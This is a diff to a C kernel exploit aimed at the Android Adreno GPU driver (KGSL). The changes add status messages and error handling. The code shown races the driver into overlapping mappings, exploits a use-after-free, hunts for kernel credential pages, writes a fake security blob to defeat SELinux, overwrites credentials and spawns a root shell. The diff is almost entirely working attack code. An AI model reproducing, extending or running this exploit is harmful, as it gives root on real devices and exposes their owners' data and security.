@@ -245,35 +245,72 @@ static void flush_dc_civac_range(void *addr, size_t size)
 
 int main(void)
 {
+    printf("[*] Starting exploit\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
     if (kgsl_fd < 0) {
         kgsl_fd = open("/dev/kgsl-3d1", O_RDWR | O_CLOEXEC);
-        if (kgsl_fd < 0) return 1;
+        if (kgsl_fd < 0) {
+            printf("[-] Failed to open kgsl device\n");
+            return 1;
+        }
     }
+    printf("[+] KGSL opened\n");
+
     kernel_base = detect_kernel_base();
+    printf("[*] Kernel base: 0x%lx\n", kernel_base);
     init_cred_addr = kernel_base + 0x28b9000ULL;
     selinux_state_addr = kernel_base + 0x28b9000ULL + 0x70;
+    printf("[*] init_cred: 0x%lx, selinux_state: 0x%lx\n", init_cred_addr, selinux_state_addr);
+
     ctx_id = create_context(kgsl_fd);
-    if (ctx_id < 0) return 1;
+    if (ctx_id < 0) {
+        printf("[-] create_context failed\n");
+        return 1;
+    }
+    printf("[+] Context created: %d\n", ctx_id);
+
     int overlap_id = create_overlap_race(kgsl_fd, ctx_id);
-    if (overlap_id < 0) return 1;
+    if (overlap_id < 0) {
+        printf("[-] overlap race failed\n");
+        return 1;
+    }
+    printf("[+] Overlap ID: %d\n", overlap_id);
+
     void *overlap = mmap((void *)OVERLAP_ADDR, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_FIXED, kgsl_fd, overlap_id);
-    if (overlap == MAP_FAILED) return 1;
+    if (overlap == MAP_FAILED) {
+        printf("[-] mmap overlap failed\n");
+        return 1;
+    }
     memset(overlap, 0, 0x1000);
+    printf("[+] Overlap mapped at %p\n", overlap);
+
     for (int i = 0; i < 0x10000; i++) {
         void *ptr = mmap((void *)(UAF_ADDR), 0x1000, PROT_READ | PROT_WRITE,
                          MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
         if (ptr != MAP_FAILED) break;
     }
-    if (kgsl_alloc_ib(kgsl_fd, ctx_id, &ib_id, &ib_ga, 0x10000)) return 1;
+    printf("[+] UAF region prepared\n");
+
+    if (kgsl_alloc_ib(kgsl_fd, ctx_id, &ib_id, &ib_ga, 0x10000)) {
+        printf("[-] IB alloc failed\n");
+        return 1;
+    }
     void *ib_m = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                       MAP_SHARED, kgsl_fd, ib_id);
-    if (ib_m == MAP_FAILED) return 1;
+    if (ib_m == MAP_FAILED) {
+        printf("[-] IB mmap failed\n");
+        return 1;
+    }
+    printf("[+] IB allocated\n");
+
+    printf("[*] Spawning child threads\n");
     for (int i = 0; i < MAX_CHILD; i++) {
         pthread_create(&child_threads[i], NULL, (void *)child_process, NULL);
     }
     usleep(1000000);
+
+    printf("[*] Spawning AVC children\n");
     for (int i = 0; i < 0x20; i++) {
         int pid = fork();
         if (pid == 0) {
@@ -292,10 +329,16 @@ int main(void)
         }
     }
     usleep(2000000);
+
     uint64_t cred_pages[MAX_CRED_PAGES];
     int cred_offs[MAX_CRED_PAGES];
     int n_cred = find_cred_pages(overlap, cred_pages, cred_offs);
-    if (n_cred == 0) return 1;
+    if (n_cred == 0) {
+        printf("[-] No cred pages found\n");
+        return 1;
+    }
+    printf("[+] Found %d cred pages\n", n_cred);
+
     int sec_off = -1;
     for (int p = 0; p < n_cred; p++) {
         uint32_t *page = (uint32_t *)(overlap + (cred_pages[p] - UAF_ADDR));
@@ -309,9 +352,13 @@ int main(void)
         if (sec_off >= 0) break;
     }
     if (sec_off < 0) sec_off = 0x60;
+    printf("[*] Security pointer offset: 0x%x\n", sec_off);
+
     uint32_t *page = (uint32_t *)(overlap + 0x1000 - 0x50);
     page[FAKE_SEC_OFFSET/4] = 1;
     flush_dc_civac_range(overlap + 0x1000 - 0x50, 0x50);
+    printf("[*] Fake security blob written\n");
+
     for (int p = 0; p < n_cred; p++) {
         uint64_t cbase = cred_pages[p];
         int coff = cred_offs[p];
@@ -365,12 +412,16 @@ int main(void)
         }
         flush_dc_civac_range(overlap + (cbase - UAF_ADDR), 0x1000);
     }
+    printf("[+] Cred overwrite done\n");
+
     sleep(2);
     quit = 1;
     for (int i = 0; i < 0x20; i++) wait(NULL);
     for (int i = 0; i < MAX_CHILD; i++) {
         pthread_join(child_threads[i], NULL);
     }
+
+    printf("[*] Launching root shell...\n");
     for (int i = 0; i < 0x10; i++) {
         int pid = fork();
         if (pid == 0) {
@@ -380,5 +431,6 @@ int main(void)
         }
         wait(NULL);
     }
+    printf("[+] Done\n");
     return 0;
 }
